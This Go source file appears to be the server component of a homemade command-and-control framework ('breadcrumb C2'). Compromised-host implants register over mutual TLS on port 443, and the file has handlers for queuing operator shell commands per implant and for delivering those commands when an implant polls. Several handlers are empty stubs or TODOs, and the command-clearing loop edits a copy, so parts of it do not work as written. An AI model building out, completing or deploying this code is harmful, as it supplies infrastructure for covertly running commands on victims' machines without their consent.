/*
	The bread loaf is the server of the breadcrumb C2. The load will have implants named 'slices'. Each user will be a
	crumb
*/

package main

import (
	"AllSecure/TeamServer/Crypt"
	"AllSecure/TeamServer/implant"
	"crypto/tls"
	"crypto/x509"
	"fmt"
	"github.com/gorilla/mux"
	"log"
	"net/http"
	"os"
	"strings"
	"time"
)

var agent_arr []implant.Agent
var router *mux.Router

func RecvCmdAll(w http.ResponseWriter, r *http.Request) {

}

func SendCommandAll(w http.ResponseWriter, r *http.Request) {

}

/*
When an implant polls the endpoint associated with this function, if there is a command stored in its bread_slice
object, the function will send the command to the implant in an HTTP Response. The implant will parse the resp,
and then perform the command. Output will be received via HTTP request.
TODO: write RecvCmdOutput function
*/
func SendCommandSingle(w http.ResponseWriter, r *http.Request) {
	err := r.ParseForm()
	if err != nil {
		panic(err)
	}
	parts := strings.Split(r.URL.Path, "/")
	id := parts[1]
	for _, agent := range agent_arr {
		if agent.Id == id && agent.CurrCmd != "" {
			log.Printf("[+] Exec command endpoint Polled at [%s] by registered slice: [%s] command to execute "+
				"[%s]\n", time.DateTime, agent.Id, agent.CurrCmd)
			fmt.Fprintf(w, "%s\n", agent.CurrCmd)
			agent.CurrCmd = ""
		}
	}

}

/*
The way this function works is an admin client  will send commands to execute via HTTP POST requests.
TODO: There can also be a goroutine loop that asks a user for commands to send to individual implants.
The CMD will be sent to REST style URLs that identify each individual active implant.
The cmd is then stored in the bread_slice object that is stored in a global array.
*/
func RecvCmdSingle(w http.ResponseWriter, r *http.Request) {

	err := r.ParseForm()
	if err != nil {
		panic(err)
	}

	cmd := r.PostFormValue("exec_cmd")

	parts := strings.Split(r.URL.Path, "/")
	id := parts[1]
	new_agent := implant.Agent{Id: id, CurrCmd: cmd}

	for index, agent_copy := range agent_arr {
		if agent_copy.Id == new_agent.Id {
			log.Printf("[+] Received cmd [%s] at [%s] to slice: [%s]\n", new_agent.CurrCmd, time.DateTime, new_agent.Id)
			agent_arr[index] = new_agent
		}
	}

}

func Register(w http.ResponseWriter, r *http.Request) {

	err := r.ParseForm()
	if err != nil {
		panic(err)
	}
	id := r.PostFormValue("slice_id")

	new_agent := implant.Agent{Id: id}
	agent_arr = append(agent_arr, new_agent)

	newExecPath := "/" + id + "/ExecCmd"
	newRecvPath := "/" + id + "/RecvCmd"
	router.HandleFunc(newExecPath, SendCommandSingle)
	router.HandleFunc(newRecvPath, RecvCmdSingle)
	log.Printf("[+] Registered New Agent at [%s], Cmd Exec Path: %s\n", time.DateTime, newExecPath)
	log.Printf("[+] Registered New Agent at [%s], Recv Cmd Exec Path: %s\n", time.DateTime, newRecvPath)

}

func InitTLSCerts() string {

	var FilePath string
	ServerPrivKey, err := Crypt.GeneratePrivateKey("C:\\Users\\Brendan Ortiz\\Documents\\GOProjcets\\AllSecure\\ServerConfig",
		"ListeningServer")
	if err != nil {
		log.Fatalln(err)
	}
	FilePath, err = Crypt.GenerateSelfSignedCert("C:\\Users\\Brendan Ortiz\\Documents\\GOProjcets\\AllSecure\\ServerConfig",
		"ListeningServer", ServerPrivKey, "127.0.0.1")
	if err != nil {
		log.Fatalln(err)
	}
	return FilePath
}

func UpdateHttpServer(Server *http.Server, ClientCertFilePath string) *http.Server {
	var (
		ClientCert []byte
		CertPool   *x509.CertPool
		TlsConfig  *tls.Config
		err        error
	)

	if ClientCert, err = os.ReadFile(ClientCertFilePath); err != nil {
		log.Fatalln(err)
	}
	CertPool = x509.NewCertPool()
	CertPool.AppendCertsFromPEM(ClientCert)

	TlsConfig = &tls.Config{ClientCAs: CertPool, ClientAuth: tls.RequireAndVerifyClientCert}

	Server = &http.Server{Addr: ":443", TLSConfig: TlsConfig}
	return Server
}

func main() {

	//implant.GenerateNewImplant()

	var (
		Server       *http.Server
		CertFilePath string
	)
	CertFilePath = InitTLSCerts()
	Server = UpdateHttpServer(Server,
		"C:\\Users\\Brendan Ortiz\\Documents\\GOProjcets\\AllSecure"+
			"\\CreatedImplants\\0446a1a6d4e84294\\CryptoKeys\\pub-0446a1a6d4e84294.pem")

	router = mux.NewRouter()
	router.HandleFunc("/ExecCmd", SendCommandAll).Methods(http.MethodPost)
	router.HandleFunc("/RecvCmd", RecvCmdAll).Methods(http.MethodPost)
	router.HandleFunc("/RegisterNewSlice", Register).Methods(http.MethodPost)

	Server.Handler = router

	log.Fatal(Server.ListenAndServeTLS(CertFilePath, strings.Replace(CertFilePath, "pub-", "priv-", -1)))
	//log.Fatal(http.ListenAndServe(":443", router))
}
